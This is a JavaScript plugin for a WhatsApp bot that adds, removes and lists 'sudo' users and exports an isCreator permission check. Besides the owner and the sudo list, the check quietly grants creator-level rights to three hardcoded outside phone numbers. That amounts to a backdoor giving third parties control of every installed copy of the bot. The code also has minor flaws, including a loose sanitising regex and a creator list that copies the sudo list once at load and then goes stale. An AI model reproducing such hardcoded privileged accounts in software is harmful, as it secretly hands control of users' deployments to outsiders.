const { cmd } = require("../command");
const fs = require("fs");
const path = require("path");
const { jidNormalizedUser } = require("baileys");

const devFilePath = path.join(__dirname, "../lib/sudo.json");
let devList = [];

// Charger la liste sudo
try {
  if (fs.existsSync(devFilePath)) {
    const rawList = JSON.parse(fs.readFileSync(devFilePath, "utf-8"));
    devList = rawList
      .map(num => {
        const jid = num.replace(/[^0-9@s.whatsapp.net]/g, "");
        return jid.includes("@s.whatsapp.net")
          ? jid
          : jid + "@s.whatsapp.net";
      })
      .filter(u => u.match(/^\d+@s\.whatsapp\.net$/));
  }
} catch (err) {
  console.error("Error loading dev list:", err);
  devList = [];
}
fs.writeFileSync(devFilePath, JSON.stringify(devList, null, 2));

const saveDevList = () => {
  fs.writeFileSync(devFilePath, JSON.stringify(devList, null, 2));
};

const getTargetJid = (m, args) => {
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    return jidNormalizedUser(m.mentionedJid[0]);
  } else if (m.quoted?.sender) {
    return jidNormalizedUser(m.quoted.sender);
  } else if (args[0]) {
    const num = args[0].replace(/\D/g, "");
    return jidNormalizedUser(num + "@s.whatsapp.net");
  } else if (m.key?.participant) {
    return jidNormalizedUser(m.key.participant);
  }
  return null;
};

// ➕ setsudo
cmd({
  pattern: "setsudo",
  alias: ["sudoadd"],
  desc: "Add a user to the sudo list",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { args, reply, isPatron, isGroup }) => {
  if (!isPatron) return reply("*📛 ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴛᴏ ᴏᴡɴᴇʀs ᴏɴʟʏ.*");
  if (isGroup) return reply("*❗ ᴘʟᴇᴀsᴇ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪɴ ᴛʜᴇ `ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ` ᴏғ ᴛʜᴇ ᴘᴇʀsᴏɴ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴅᴅ.*");

  await conn.sendMessage(m.key.remoteJid, { react: { text: "➕", key: m.key } });

  let target = getTargetJid(m, args);
  if (!target) return reply("*_ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ, ᴍᴇɴᴛɪᴏɴ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ._*");

  if (devList.includes(target)) {
    return conn.sendMessage(m.chat, {
      text: "@" + target.split("@")[0] + " *ɪs ᴀʟʀᴇᴀᴅʏ ɪɴ ᴛʜᴇ sᴜᴅᴏ ʟɪsᴛ.*",
      mentions: [target]
    }, { quoted: m });
  }

  devList.push(target);
  saveDevList();

  await conn.sendMessage(m.chat, {
    text: "✅ @" + target.split("@")[0] + " *ʜᴀs ʙᴇᴇɴ `ᴀᴅᴅᴇᴅ` ᴛᴏ ᴛʜᴇ sᴜᴅᴏ ʟɪsᴛ.*",
    mentions: [target]
  }, { quoted: m });
});

// ⤵️ delsudo
cmd({
  pattern: "delsudo",
  alias: ["sudodel"],
  desc: "Remove a user from the sudo list",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { args, reply, isPatron, isGroup }) => {
  if (!isPatron) return reply("*📛 ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴛᴏ ᴏᴡɴᴇʀs ᴏɴʟʏ.*");
  if (isGroup) return reply("*❗ ᴘʟᴇᴀsᴇ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ.*");

  await conn.sendMessage(m.key.remoteJid, { react: { text: "⤵️", key: m.key } });

  let target = getTargetJid(m, args);
  if (!target) return reply("*_ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ, ᴍᴇɴᴛɪᴏɴ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ._*");

  if (!devList.includes(target)) {
    return conn.sendMessage(m.chat, {
      text: "@" + target.split("@")[0] + " *ɪs ɴᴏᴛ ɪɴ ᴛʜᴇ sᴜᴅᴏ ʟɪsᴛ.*",
      mentions: [target]
    }, { quoted: m });
  }

  devList = devList.filter(u => u !== target);
  saveDevList();

  await conn.sendMessage(m.chat, {
    text: "✅ @" + target.split("@")[0] + " *ʜᴀs ʙᴇᴇɴ `ʀᴇᴍᴏᴠᴇᴅ` ғʀᴏᴍ ᴛʜᴇ sᴜᴅᴏ ʟɪsᴛ.*",
    mentions: [target]
  }, { quoted: m });
});

// 📋 listsudo
cmd({
  pattern: "listsudo",
  alias: ["sudolist"],
  desc: "List all sudo users",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { reply, isPatron }) => {
  if (!isPatron) return reply("*📛 ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴛᴏ ᴏᴡɴᴇʀs ᴏɴʟʏ.*");

  await conn.sendMessage(m.key.remoteJid, { react: { text: "📋", key: m.key } });

  if (devList.length === 0) return reply("*ɴᴏ sᴜᴅᴏ ᴜsᴇʀs ғᴏᴜɴᴅ.*");

  const mentions = [];
  const list = devList.map((u, i) => {
    mentions.push(u);
    return `${i + 1}. @${u.split("@")[0]}`;
  }).join("\n");

  await conn.sendMessage(m.chat, {
    text: "*📄 xᴛʀᴇᴍᴇxᴍᴅ/sᴜᴅᴏ ᴜsᴇʀs ʟɪsᴛ:*\n" + list,
    mentions
  }, { quoted: m });
});

// Vérification créateur
let udp = null;
function setUdp(num) { udp = num; }

const jawad = ["2348025532222", "528145550855", "2348133729715"];
const extraCreators = [
  ...jawad.map(num => num.includes("@s.whatsapp.net") ? num : num + "@s.whatsapp.net"),
  ...devList
];

function isCreator(jid, user) {
  if (!jid || !user?.user?.id) return false;

  const normJid = jidNormalizedUser(user.user.id);
  const altJid = user.user.lid ? jidNormalizedUser(user.user.lid) : null;
  const base = jid.replace(/@(s\.whatsapp\.net|lid)$/, "");
  const jidS = base + "@s.whatsapp.net";
  const jidL = base + "@lid";

  const isSelf = (jidS === normJid) || (altJid && [jidS, jidL].includes(altJid));
  if (isSelf) return true;

  const inCreators = [base, jidS, jidL].some(x => extraCreators.includes(x));
  const inDevList = [base, jidS, jidL].some(x => devList.includes(x));
  const isUdp = udp !== null && base === udp;

  return isSelf || inCreators || inDevList || isUdp;
}

module.exports = { isCreator, setUdp };
